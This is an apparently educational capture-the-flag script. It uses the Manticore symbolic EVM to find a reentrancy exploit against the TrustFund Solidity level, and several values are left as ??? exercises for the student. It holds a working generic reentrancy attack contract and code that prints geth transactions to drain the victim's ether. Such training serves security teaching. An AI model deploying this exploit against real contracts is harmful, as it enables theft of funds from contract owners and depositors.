'''
In this level we'll use a generic reentrancy exploit contract, add symbolic data to it, and use it to exploit the TrustFund CTF level
This exploit script will output a transaction that creates this exploit contract, set parameters, and execute the exploit
To ensure that the transactions have the right addresses, you'll have to recreate the current nonces of addresses that you're interacting with
'''

from manticore.ethereum import ManticoreEVM
import sys

# Parse arguments
#   arg1 = from_address = Your wallet address
#   arg2 = si_level_address = Your TrustFund CTF level address
#   arg3 = contract_creator_address
#          TrustFund launcher 0x2f5551674A7c8CB6DFb117a7F2016C849054fF80
#          Needed to generate the appropriate addresses in the Manticore EVM
#   arg4 = sol_file = TrustFund CTF level source code to symbolically execute
from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
contract_creator_address = int(sys.argv[3], 16) if len(sys.argv)>3 else "<contract creator address>"
sol_file = sys.argv[4] if len(sys.argv)>4 else "../SI_ctf_levels/TrustFund.sol"

# Fix the amount of gas to use.  A re-entrancy attack requires
# a lot so set to something close to the gas block limit
gas = 4000000

# Read in the contract source
with open(sol_file, "r") as f:
    contract_src = f.read()

# Instantiate Manticore's Symbolic Ethereum Virtual Machine
m = ManticoreEVM()
m.verbosity(0)

# Generic reentrancy exploit contract to attack TrustFund with
exploit_source_code = '''
pragma solidity ^0.4.15;

contract GenericReentranceExploit {
    int reentry_reps; 
    address vulnerable_contract;
    address owner;
    bytes reentry_attack_string;

    function GenericReentranceExploit(){
        owner = msg.sender;
    }

    // These set_* functions are used to point this exploit contract at its
    // victim and setup the necessary values to exploit it correctly. For
    // this level, we'll make some of these values symbolic and let manticore
    // discover them for us.
    function set_vulnerable_contract(address _vulnerable_contract){
        vulnerable_contract = _vulnerable_contract ;
    }

    function set_reentry_attack_string(bytes _reentry_attack_string){
        reentry_attack_string = _reentry_attack_string;
    }

    function set_reentry_reps(int256 reps){
        reentry_reps = reps;
    }

    function proxycall(bytes data) payable{
        // Begin re-entrancy exploit
        vulnerable_contract.call.value(msg.value)(data);
    }

    function get_money(){
        // Used to retrieve the ether after exploitation.  Manticore currently
        // will kill a state if a contract is destroyed, so just send the
        // balance back instead.
        owner.send(this.balance);
    }

    function () payable{
        // reentry_reps is used to execute the attack a fixed number of times
        // Without it, there is an infinite loop between the vulnerable
        // contract function and the fallback function
        if (reentry_reps > 0){
            reentry_reps = reentry_reps - 1;
            vulnerable_contract.call(reentry_attack_string);
        }
    }
}
'''

# Manticore currently only allows for incrementing a nonce rather than setting
# it.  This helper function is a kludge to make your code look better :)
def set_nonce(world,address,nonce):
    while world.get_nonce(address)<nonce:
        world.increase_nonce(address)

# Initialize contract balance to retrieve.
contract_balance = ???
# Initialize attacker wallet balance (We don't need to send any ETH to
#   exploit TrustFund, but other re-entrancy attacks may require it).
attacker_balance = ??? 

# Create the TrustFund level using the TrustFund launcher and give it
#   the initial balance for the level
creator_account = m.create_account(address=contract_creator_address,balance=contract_balance)

# Create your wallet account and set its balance
attacker_account = m.create_account(address=from_address,balance=attacker_balance)

# Set the nonce for your account.  The nonce for an address starts at '1' 
#   (EIP 161) and is incremented by one for each transaction. The nonce for
#   the attacker account is your current wallet's nonce.  It is needed to get
#   the right address for the created generic exploit contract.  You can obtain
#   its value either via Metamask or from geth via the call
#   eth.getTransactionCount(eth.accounts[0]).
set_nonce(m.get_world(),attacker_account.address,???)

# We need the address of the TrustFund level we're attacking.  This is
#   calculated by the address of the launcher and its nonce at the time
#   the level was deployed.  You can find this via examining the contract
#   transaction on Etherscan.  If it is not set appropriately, you will
#   need to manually change the addresses in the exploit that has been 
#   generated to fix the victim's address.  One option would be to
#   leave this nonce as '1', then manually change the victim contract
#   address
set_nonce(m.get_world(),creator_account.address,???)

# Create the TrustFund CTF level contract on the EVM using launcher wallet.
#   We specify the address of the victim as a sanity check.  If the nonce
#   and creator address don't result in the address passed in via "address",
#   an error will be thrown.
contract_account = m.solidity_create_contract(contract_src,
    contract_name="TrustFund",
    owner=creator_account,
    address=si_level_address,
    args=(0,0),
    balance=contract_balance)
print("Calculated victim contract address: "+hex(contract_account.address))

# Create the exploit contract on the EVM using your wallet
exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker_account)
print("Calculated exploit contract address: "+hex(exploit_account.address))

print("Setting up the generic exploit contract")
exploit_account.set_vulnerable_contract(contract_account)

# Set the number of times we re-enter the vulnerable function
#   (including first call)
exploit_account.set_reentry_reps(???)

print("Setting symbolic attack string")
# Specify length of symbolic buffer that stores the msg.data 
#   used in attack contract to call vulnerable function 
reentry_string = m.make_symbolic_buffer(???)
# Sets msg.data for exploit contract to call victim contract with
exploit_account.set_reentry_attack_string(reentry_string)

# Run the exploit symbolically
print("Running reentrancy transaction")
exploit_account.proxycall(reentry_string)

# Retrieve funds after reentrancy transaction
print("Return ether to our wallet")
exploit_account.get_money() 

# Symbolically execute program to find an exploit that obtains our funds back.
for state in m.running_states:
    world = state.platform
    # Check if funds can be retrieved
    if state.can_be_true(world.get_balance(attacker_account.address) == contract_balance+attacker_balance):
      # If so, add constraint
      #   Then concretize symbolic buffer to provide one solution
      state.constraints.add(world.get_balance(attacker_account.address) == contract_balance+attacker_balance)
    
      print("Found a winning state, printing all transactions")
      # Iterate through all of the transactions we've sent concretizing
      #   them if necessary
      for transaction in world.transactions:
        # Concretize transaction
        data = state.solve_one(transaction.data)
        caller = state.solve_one(transaction.caller)
        address = state.solve_one(transaction.address)
        value = state.solve_one(transaction.value)
        # Only print the ones that are sent from our attacker account
        #   Ignores internal and victim transactions
        if caller==attacker_account.address:
            geth_str = "eth.sendTransaction({"
            geth_str += f'''data:"0x{data.hex()}", '''
            geth_str += f'''from:"0x{caller:040x}", '''
            # For contract creation transaction, no 'to' field is included
            if transaction.sort != 'CREATE':
                geth_str += f'''to:"0x{address:040x}", '''
            geth_str += f'''value:"0x{value:x}", '''
            geth_str += f'''gas:"0x{gas:x}"'''
            geth_str += "})"
            print(geth_str)
      sys.exit(0)

print("Couldn't find a winning state")
